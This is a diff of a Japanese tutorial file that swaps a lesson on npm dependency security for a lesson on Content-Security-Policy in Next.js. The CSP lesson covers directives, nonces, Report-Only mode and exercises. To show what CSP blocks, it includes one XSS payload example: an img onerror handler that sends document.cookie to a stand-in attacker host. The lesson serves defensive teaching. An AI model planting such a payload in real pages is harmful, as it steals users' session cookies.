@@ -1,339 +1,455 @@
-# lesson120: 依存性セキュリティ（npm audit / Dependabot）
+# lesson118: Content-Security-Policy（CSP）実践
 
 ## ゴール
 
-- 「依存パッケージ経由で攻撃される」という **サプライチェーン** リスクを理解する
-- `npm audit` のレポートを読み、優先度を判断できる
-- **Dependabot / Renovate** で更新を自動化できる
-- パッケージを採用する時の判断軸（DL 数 / メンテナンス / 依存の深さ）を持つ
-- ロックファイル / 整合性検証 / SBOM の役割を知る
+- CSP が **XSS の最後の砦** として何を防ぐか説明できる
+- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
+- `nonce` / `hash` で **必要な inline script を許可** できる
+- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
+- Next.js で CSP を **proxy + Middleware で動的に発行** できる
+
+::: tip 前提
+このレッスンは「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は「Cookie と Web セキュリティ」を確認してください。
+:::
 
 ## 解説
 
-### サプライチェーン攻撃とは
+### CSP は最後の防衛線
 
-「自分のコードは安全」でも、**依存している npm パッケージ** が改ざんされると、そのまま自分のサイトに **攻撃コードが配布** されます。実際に過去:
+XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（「Cookie と Web セキュリティ」）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。
 
-- `event-stream` 事件（2018）: 人気ライブラリの管理権限を譲り受けた攻撃者が暗号通貨ウォレット狙いのコードを混入
-- `colors.js` / `faker.js` 事件（2022）: 作者本人が抗議で暴走コードを混入
-- typosquatting: `react-doom`（react-dom の typo）のような偽パッケージ
+Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。
 
-これらは npm 公式に公開されたパッケージ経由で広がります。**依存ツリー** が深くなるほど面が広がり、リスクも増す。
+仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。
 
-### npm audit
+### 最小例
 
-`npm audit` は **既知の脆弱性 DB**（GitHub Advisory Database） に対し、現在の依存ツリーをチェックします。
-
-```bash
-npm audit
+```http
+Content-Security-Policy: default-src 'self';
 ```
 
-出力例:
+これだけで:
 
+- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
+- inline script（`<script>...</script>`）も **デフォルト拒否**
+- inline style（`<div style="...">`）も拒否
+
+なぜ inline まで拒否するのか:
+
+```html
+<!-- 攻撃者が混入させたい -->
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
 ```
-# npm audit report
 
-semver  <5.7.2
-Severity: high
-ReDoS in semver - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw
-fix available via `npm audit fix`
-node_modules/semver
+これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。
 
-5 vulnerabilities (2 high, 3 moderate)
-```
+### 主要ディレクティブ
 
-### 重要度（Severity）
-
-| レベル | 対応の目安 |
+| ディレクティブ | 制御するリソース |
 |---|---|
-| **critical** | 即座に対応。本番が止まっても直す |
-| **high** | 計画的に修正、長くて 1 週間 |
-| **moderate** | 月次でまとめて対応 |
-| **low** | 余力で対応 |
+| `default-src` | 他で指定がないリソース全部のフォールバック |
+| `script-src` | JavaScript |
+| `style-src` | CSS |
+| `img-src` | `<img>` |
+| `font-src` | フォント |
+| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
+| `frame-src` | `<iframe>` |
+| `media-src` | `<audio>` / `<video>` |
+| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
+| `base-uri` | `<base>` タグの `href` |
+| `form-action` | `<form>` の `action` |
+| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |
 
-### `npm audit fix`
+### ソース指定子
 
-```bash
-npm audit fix
+| 値 | 意味 |
+|---|---|
+| `'self'` | 自分のオリジン |
+| `'none'` | すべて拒否 |
+| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
+| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
+| `https:` | あらゆる HTTPS オリジン |
+| `https://example.com` | 個別オリジン |
+| `*.example.com` | サブドメインワイルドカード |
+| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
+| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
+| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |
+
+### inline script を許可する 3 つの方法
+
+「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。
+
+#### 1. `'unsafe-inline'`（NG）
+
+`Content-Security-Policy: script-src 'self' 'unsafe-inline';`
+
+→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。
+
+#### 2. nonce（推奨）
+
+リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:
+
+- ヘッダに `script-src 'nonce-abc123' 'self';`
+- `<script nonce="abc123">...</script>`
+
+両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。
+
+#### 3. hash
+
+inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。
+
+### `'strict-dynamic'`
+
+nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。
+
+```
+script-src 'nonce-abc123' 'strict-dynamic';
 ```
 
-semver の範囲内で **自動アップデート** します。安全だが、メジャーバージョン更新が必要なケースは手動。
+これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。
 
-```bash
-npm audit fix --force
+### `Report-Only` で先に検証
+
+本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:
+
+- ブラウザは **違反をブロックせず**
+- 違反を **`report-uri` / `report-to`** に POST してくれる
+
+```
+Content-Security-Policy-Report-Only:
+  default-src 'self';
+  report-uri /csp-report;
+  report-to csp-endpoint;
 ```
 
-`--force` で **メジャーアップデート込み** で直してくれますが、**破壊的変更** が混じる可能性があります。CI / 動作確認とセットでないと危険。
-
-### 「audit だけ」では足りない
-
-`npm audit` の限界:
-
-- **devDependencies の脆弱性** がノイズになりやすい（本番に届かないものまで警告）
-- **fix なし** の脆弱性は手動で対処するしかない
-- **新しい脆弱性** は DB に登録された後に通知される（ゼロデイには無力）
-
-→ **audit + 自動アップデート + パッケージ選定** の三本柱で守る。
-
-### Dependabot
-
-GitHub の純正サービス。**依存パッケージのバージョンを自動で PR 作成** してくれます。
-
-`.github/dependabot.yml`:
-
-```yaml
-version: 2
-updates:
-  - package-ecosystem: "npm"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    open-pull-requests-limit: 10
-    groups:
-      production:
-        dependency-type: "production"
-      development:
-        dependency-type: "development"
+```ts
+// app/api/csp-report/route.ts
+export async function POST(req: Request) {
+  const body = await req.json();
+  console.log("CSP violation:", body);
+  return new Response(null, { status: 204 });
+}
 ```
 
-挙動:
+数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。
 
-- **毎週月曜** に依存をチェック
-- 更新があれば PR を作る（`production` / `development` でグループ化）
-- セキュリティ脆弱性は **常時監視** され、即時 PR
+Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。
 
-GitHub の **「Security」タブ** に Dependabot Alerts が並びます。
+### Next.js での実装
 
-### Renovate
+#### 静的なポリシー（next.config.ts のヘッダ）
 
-[Renovate](https://docs.renovatebot.com/) は OSS の代替。Dependabot より **設定が柔軟** で、Bot が活発に開発されています。
+```ts
+// next.config.ts
+import type { NextConfig } from "next";
 
-`renovate.json`:
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+`.replace(/\s{2,}/g, " ").trim();
 
-```json
-{
-  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
-  "extends": [
-    "config:recommended",
-    ":dependencyDashboard"
+const nextConfig: NextConfig = {
+  async headers() {
+    return [
+      {
+        source: "/:path*",
+        headers: [
+          { key: "Content-Security-Policy", value: cspHeader },
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        ],
+      },
+    ];
+  },
+};
+
+export default nextConfig;
+```
+
+::: warning Next.js は inline をたくさん使う
+Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。
+
+そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
+:::
+
+#### 動的なポリシー（Proxy + nonce）
+
+Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。
+
+```ts
+// proxy.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function proxy(req: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const csp = `
+    default-src 'self';
+    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
+    style-src 'self' 'nonce-${nonce}';
+    img-src 'self' data: https:;
+    font-src 'self';
+    connect-src 'self';
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';
+    upgrade-insecure-requests;
+  `.replace(/\s{2,}/g, " ").trim();
+
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set("Content-Security-Policy", csp);
+
+  return response;
+}
+
+export const config = {
+  matcher: [
+    "/((?!api|_next/static|_next/image|favicon.ico).*)",
   ],
-  "schedule": ["before 9am on monday"],
-  "packageRules": [
-    {
-      "matchPackagePatterns": ["^@types/"],
-      "groupName": "type definitions"
-    },
-    {
-      "matchUpdateTypes": ["patch", "minor"],
-      "automerge": true
-    }
-  ]
+};
+```
+
+#### Server Component で nonce を読む
+
+```tsx
+// app/layout.tsx
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+
+  return (
+    <html lang="ja">
+      <body>
+        {children}
+        <Script
+          src="https://example.com/analytics.js"
+          nonce={nonce}
+          strategy="afterInteractive"
+        />
+      </body>
+    </html>
+  );
 }
 ```
 
-特徴:
+`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。
 
-- **Group で複数パッケージをまとめて** PR
-- `automerge: true` で **CI 通過すれば自動マージ**（patch だけなど安全範囲）
-- Dependency Dashboard の Issue で **全更新を一覧** できる
-- monorepo / 言語 / Docker などへの対応が広い
+### Trusted Types
 
-「Dependabot は標準、Renovate はもっと管理したい場合」の使い分け。
+CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。
 
-### Socket と OSV-Scanner
-
-audit では拾えない攻撃を補う 2 つのツール。
-
-#### Socket
-
-[socket.dev](https://socket.dev/) は **疑わしいパッケージの挙動** を静的解析で検知。`postinstall` でネットに繋いだ / 環境変数を読んだ / shell を起動した、などのフラグを立てます。
-
-```bash
-npx @socketsecurity/cli scan
+```
+Content-Security-Policy: require-trusted-types-for 'script';
 ```
 
-GitHub Actions で **PR 単位** に新規依存をスキャンする運用も可能。
+未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。
 
-#### OSV-Scanner（Google）
+### 確認ツール
 
-```bash
-npx osv-scanner -L package-lock.json
-```
+- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
+- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
+- ブラウザの DevTools → Network → ヘッダ表示
 
-OSV.dev という横断的脆弱性 DB を参照。Python / Go / Rust などにも使えます。
+### CSP 以外のセキュリティヘッダ
 
-### 整合性検証
+| ヘッダ | 役割 |
+|---|---|
+| `Strict-Transport-Security` | HTTPS 強制 |
+| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
+| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
+| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
+| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
+| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |
 
-`package-lock.json` には各パッケージの **`integrity`** フィールドがあり、ハッシュで完全性を確認します。
+CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。
 
-```json
-{
-  "node_modules/react": {
-    "version": "19.2.0",
-    "integrity": "sha512-...",
-    "resolved": "https://registry.npmjs.org/react/-/react-19.2.0.tgz"
-  }
-}
-```
+### よくある事故
 
-`npm ci` は **lock の通りにそのままインストール** し、ハッシュが合わなければエラー。CI ではこれを使って改ざんを検知。
+#### 1. Google Fonts / Google Tag Manager が動かない
 
-### SBOM（Software Bill of Materials）
+→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホストを許可する。具体的には `https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`。
 
-「ソフトウェアの **部品表**」。何のパッケージをどのバージョンで使っているかを **機械可読な形式**（SPDX / CycloneDX） で出力します。
+#### 2. Sentry / Datadog の送信が拒否される
 
-```bash
-npm sbom --sbom-format=cyclonedx > sbom.json
-```
+→ `connect-src` に Sentry のエンドポイントを追加
 
-なぜ必要:
+#### 3. 開発時のホットリロードが拒否される
 
-- 新しい脆弱性が報告された時、**自社のどのプロダクトが影響を受けるか** を即座に確認できる
-- 米国の調達基準では SBOM の提出を求めるケースが増えている
+→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる
 
-GitHub には **Dependency Graph** が組み込みで、リポジトリの依存を可視化してくれます。
+#### 4. iframe 埋め込みされる事故
 
-### パッケージを採用する時の判断軸
-
-新しい npm パッケージを入れる時、次を見る習慣を。
-
-#### 1. ダウンロード数
-
-[npmtrends](https://npmtrends.com/) でダウンロード推移を確認。**月数百万 DL** あると安定。**急増** はバズ後で挙動が変わるかも、**減少** はメンテナンスが止まった可能性。
-
-#### 2. メンテナンスの頻度
-
-GitHub の **コミット頻度 / 最終リリース日 / 未解決 Issue 数** をチェック。**3 ヶ月コミットがない** と要注意。
-
-#### 3. 依存の深さ
-
-`npx npm-why some-package` や [Bundlephobia](https://bundlephobia.com/) で **どんな子依存を引っ張ってくるか** を見る。**子依存が深い** とサプライチェーン面が広がる。
-
-#### 4. ライセンス
-
-MIT / Apache 2.0 / BSD は OK。**GPL** は公開要件があるので業務利用前に法務確認。
-
-#### 5. メンテナーの質
-
-GitHub の **メンテナー一覧** / セキュリティポリシーの整備状況。**1 人メンテナンス** はリスクが集中する。
-
-#### 6. 代替案
-
-「**標準で書ける** ことを依存追加で済ませていないか」を再検討。`Date.now()` / `fetch` / `Intl` / `Set` など、**ブラウザ / Node 標準で書ける** ものは依存を入れない方がよい。
-
-### ゼロデイへの備え
-
-audit に載る前の脆弱性（ゼロデイ）への対処は限定的:
-
-- **GitHub Advisory** をウォッチ
-- **新パッケージの即採用は避ける**（少なくとも数日寝かせる）
-- **`postinstall` を実行しないインストール**（`--ignore-scripts`）を CI で
-- **lockfile を厳しく**（`npm ci`、`pnpm install --frozen-lockfile`）
-
-### おすすめの基本セット
-
-最小構成:
-
-1. **Dependabot Alerts ON**（GitHub の Security タブ）
-2. **Dependabot version updates** で週次 PR
-3. **CI で `npm audit --omit=dev`** を実行（本番依存だけチェック）
-4. **`npm ci`** で lockfile 通りインストール
-5. **SBOM をビルド成果物に含める**（後で照会できる）
-
-これで「**最低限** のサプライチェーン対策」になります。
+→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）
 
 ## 演習
 
 ### ゴール
 
-- `npm audit` を読む
-- Dependabot を有効にして PR が来る状態を作る
-- 新しいパッケージを採用する判断材料を集める
+- Next.js プロジェクトに **動的 nonce CSP** を入れる
+- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える
 
-### 手順 1: 既存プロジェクトで audit
-
-```bash
-cd /path/to/your-project
-npm audit
-npm audit --json | jq '.metadata.vulnerabilities'
-```
-
-`.metadata.vulnerabilities` で重要度ごとの件数が JSON で見えます。
-
-### 手順 2: 自動修正を試す
+### 手順 1: 新規プロジェクト
 
 ```bash
-npm audit fix       # semver 範囲内で自動更新
-git diff package*.json
+npx create-next-app@latest csp-sample --ts --app
+cd csp-sample
 ```
 
-修正後は **必ず動作確認 + テスト**。
+### 手順 2: Report-Only で開始
 
-### 手順 3: Dependabot を有効化
+`next.config.ts`:
 
-`.github/dependabot.yml`:
+```ts
+const reportOnlyCsp = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  report-uri /api/csp-report;
+`.replace(/\s{2,}/g, " ").trim();
 
-```yaml
-version: 2
-updates:
-  - package-ecosystem: "npm"
-    directory: "/"
-    schedule: { interval: "weekly" }
-    groups:
-      minor-and-patch:
-        update-types: ["minor", "patch"]
+export default {
+  async headers() {
+    return [
+      {
+        source: "/:path*",
+        headers: [
+          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        ],
+      },
+    ];
+  },
+};
 ```
 
-GitHub の **Settings → Code security → Dependabot alerts** を ON。`Settings → Code security → Dependabot security updates` も ON。
+### 手順 3: レポートエンドポイント
 
-### 手順 4: パッケージ採用の練習
+`app/api/csp-report/route.ts`:
 
-候補: `dayjs` / `date-fns` / `luxon`
+```ts
+export async function POST(req: Request) {
+  const text = await req.text();
+  console.log("[CSP Report]", text);
+  return new Response(null, { status: 204 });
+}
+```
 
-それぞれを次の観点で比較:
+### 手順 4: わざと違反を起こす
 
-- npmtrends の DL 推移
-- GitHub のメンテナンス頻度
-- Bundlephobia のサイズと依存
-- TypeScript 型定義の有無
-- ライセンス
+`app/page.tsx`:
 
-採用する 1 つを決めて、`npm install` する。
+```tsx
+export default function Home() {
+  return (
+    <main style={{ padding: 24 }}>
+      <h1>CSP Demo</h1>
+      <img src="https://example.com/some-image.png" alt="" />
+      <iframe src="https://example.com" />
+    </main>
+  );
+}
+```
 
-### 手順 5: SBOM を出す
+`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。
 
-```bash
-npm sbom --sbom-format=cyclonedx --omit=dev > sbom.json
-ls -la sbom.json
+### 手順 5: 動的 nonce に切り替える
+
+`proxy.ts`:
+
+```ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function proxy(req: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const csp = `
+    default-src 'self';
+    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
+    style-src 'self' 'nonce-${nonce}';
+    img-src 'self' data:;
+    connect-src 'self';
+    frame-ancestors 'none';
+    upgrade-insecure-requests;
+  `.replace(/\s{2,}/g, " ").trim();
+
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set("x-nonce", nonce);
+
+  const res = NextResponse.next({ request: { headers: requestHeaders } });
+  res.headers.set("Content-Security-Policy", csp);
+  return res;
+}
+
+export const config = {
+  matcher: [
+    "/((?!api|_next/static|_next/image|favicon.ico).*)",
+  ],
+};
+```
+
+`app/layout.tsx`:
+
+```tsx
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+  return (
+    <html lang="ja">
+      <body>
+        {children}
+        <Script id="hello" nonce={nonce}>
+          {`console.log('hello with nonce')`}
+        </Script>
+      </body>
+    </html>
+  );
+}
 ```
 
 ### 期待出力
 
-- `npm audit` で脆弱性の表が出る（または `0 vulnerabilities`）
-- Dependabot を有効化すると **数時間〜1 日で初回の PR / Alert** が来る
-- パッケージ比較の表ができ、採用根拠を説明できる
-- SBOM の JSON が生成される
+- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
+- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
+- DevTools の Console に CSP 違反があると **赤い警告** が出る
 
 ### 変える
 
-- `dependabot.yml` の `interval` を `daily` に変えて頻度を上げる
-- `automerge: true` のルールで patch 更新を自動マージにする
-- CI に `npm audit --omit=dev --audit-level=high` を追加して **high 以上で fail** にする
+- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
+- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
+- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察
 
 ### 自分で書く（任意）
 
-- Renovate を導入し、Dashboard Issue で全更新を一覧する
-- Socket / OSV-Scanner を CI に組み込む
-- 自社で許可するライセンスを決め、許可外があれば fail するルールを CI に書く
+- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
+- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
+- CSP Evaluator にヘッダを貼って **A 評価** を狙う
 
 ## まとめ
 
-- 自分のコードが安全でも **依存パッケージ経由** で攻撃される（サプライチェーン）
-- **`npm audit`** で既知の脆弱性をチェック。Severity に従って対応
-- 自動修正は `npm audit fix`、メジャー込みなら `--force`（要動作確認）
-- **Dependabot / Renovate** で依存更新を自動 PR 化
-- `npm audit` の補完に **Socket / OSV-Scanner**
-- **lockfile + `npm ci` + integrity** で改ざん検知
-- **SBOM** で「自社の何が影響を受けるか」を素早く特定
-- 新しいパッケージは **DL 数 / メンテ頻度 / 依存の深さ / ライセンス** で判断
-- 「**標準で書けるなら依存しない**」が最大の防御
+- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
+- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
+- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
+- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
+- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
+- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
+- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
+- CSP Evaluator / Mozilla Observatory で診断
